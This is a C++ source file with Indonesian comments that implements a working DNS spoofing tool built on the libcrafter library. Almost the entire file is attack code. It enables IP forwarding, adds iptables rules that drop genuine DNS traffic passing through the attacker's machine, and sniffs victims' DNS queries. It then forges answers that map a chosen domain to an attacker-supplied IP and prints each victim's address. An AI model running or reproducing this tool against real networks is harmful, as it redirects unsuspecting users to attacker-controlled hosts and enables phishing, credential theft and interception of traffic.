/*

Dibuat pada 4 oktober 2016

*/

#include <iostream>
#include <crafter.h>
#include <csignal>

using namespace std;
using namespace Crafter;

// interface untuk menerima dan mengirim paket dns
string iface;
// nama domain yang akan di spoof
string spoofed_domain;
// alamat ip yang akan diberikan ke victim
string rdata;
// mac address attacker, untuk filter agar attacker tidak senjata makan tuan
string myMac;
// sniffer yang digunakan untuk menangkap paket dns
Sniffer* sniff;


// CTRL + C untuk menghentikan spoofing
void ctrl_c(int dummy)
{
    cout << "[@] Menghentikan DNS Spoofing " << endl;
    sniff->Cancel();
}

// Memblok Paket dns yang melewati komputer kita
void block_iptables();

// Meng unblock Paket dns yang melewati komputer kita
void unblock_iptables();

// Mengambil DNS Query yang dikirim oleh victim
void get_dns_query(Packet* sniff_packet, void* user);

int main(int argc, char **argv)
{
    // periksa apakah pemanggilan program sudah benar
    if(argc != 4)
    {
        cout << "Usage : " << argv[0] << " [Interface] [Domain] [Spoofed Address]" << endl;
        return 0;
    }
    else
    {
        // menentukan interface
        iface = argv[1];

        // menentukan domain yang akan di spoof
        spoofed_domain = argv[2];

        // menentukan ip yang akan diberikan
        rdata = argv[3];

        // menentukan MAC Address saya
        myMac = GetMyMAC(iface);

        // blok paket dns
        block_iptables();

        // membuat sniffer untuk menangkap dns query
        sniff = new Sniffer("udp and dst port 53", iface, get_dns_query);

        // tekan ctrl + c untuk menghentikan spoofing
        signal(SIGINT, ctrl_c);

        // mulai sniffing
        cout << "[@] Memulai DNS Spoofing" << endl;
        sniff->Capture();

        // unblok paket dns
        unblock_iptables();
    }

    return 0;
}

void block_iptables()
{
    // jalankan ip forwarding
    system("echo 1 > /proc/sys/net/ipv4/ip_forward");

    // drop paket dns query dari victim ke dns server yang asli
    system("iptables -A FORWARD -p udp --dport 53 -j DROP");

    // drop paket dns answer dari dns server yang asli ke victim
    system("iptables -A FORWARD -p udp --sport 53 -j DROP");
}

void unblock_iptables()
{
    // hentikan ip forwarding
    system("echo 0 > /proc/sys/net/ipv4/ip_forward");

    // menghapus rule blok dns query dari victim
    system("iptables -D FORWARD -p udp --dport 53 -j DROP");

    // menghapus rule blok dns answer dari dns server
    system("iptables -D FORWARD -p udp --sport 53 -j DROP");
}

void get_dns_query(Packet* sniff_packet, void* user)
{
    Ethernet* eth_layer = GetEthernet(*sniff_packet);

    // cek apakah pengirimnya bukan saya
    if(eth_layer->GetSourceMAC() != myMac)
    {
        // ambil layer DNS
        DNS dns_layer;
        dns_layer.FromRaw( *(GetRawLayer(*sniff_packet)) );

        // ambil qname (alamat url yang diminta)
        string qname = dns_layer.Queries[0].GetName();

        // apakah qname sama dengan domain yang akan di spoof ?
        if(qname.find(spoofed_domain) != string::npos)
        {
             // ambil layer IP
            IP* ip_layer = GetIP(*sniff_packet);

            // ambil IP pengirim
            string ip_victim = ip_layer->GetSourceIP();

            // ambil IP tujuan (Name Server)
            string ip_dns = ip_layer->GetDestinationIP();

            /* ----------------------------------------------------------------- */

            // ambil layer UDP
            UDP* udp_layer = GetUDP(*sniff_packet);

            // ambil source port
            short_word src_port = udp_layer->GetSrcPort();

            // ambil dst port
            short_word dst_port = udp_layer->GetDstPort();

            // membuat dns answer
            DNS::DNSAnswer dns_answer;
            dns_answer.SetName(qname);
            dns_answer.SetRData(rdata);

            // meletakkan dns answer ke dns layer
            dns_layer.Answers.push_back(dns_answer);

            /* ----------------------------------------------------------------- */

            // tampilkan informasi ke layar
            cout << endl;
            cout << "[@] IP Victim \t: " << ip_victim << endl;
            cout << "[@] IP DNS \t: " << ip_dns << endl;
            cout << "[@] Src Port \t: " << src_port << endl;
            cout << "[@] Query \t: " << qname << endl;

            /* ----------------------------------------------------------------- */

            // membuat IP layer yang akan dikirim
            IP ip_layer2;
            ip_layer2.SetDestinationIP(ip_victim);
            ip_layer2.SetSourceIP(ip_dns);

            // membuat UDP layer
            UDP udp_layer2;
            udp_layer2.SetSrcPort(dst_port);
            udp_layer2.SetDstPort(src_port);

            // ubah dns paket menjadi dns answer
            dns_layer.SetQRFlag(1);
            dns_layer.SetRAFlag(1);

            // membuat paket yang akan dikirim ke victim
            Packet packet;
            packet.PushLayer(ip_layer2);
            packet.PushLayer(udp_layer2);
            packet.PushLayer(dns_layer);

            // kirim paket
            Packet* rcv = packet.SendRecv(iface);

            if(rcv)
            {
                cout << "[@] Paket Terkirim" << endl;
            }
            else
            {
                cout << "[@] Paket Tidak Terkirim" << endl;
            }
        }
    }
}
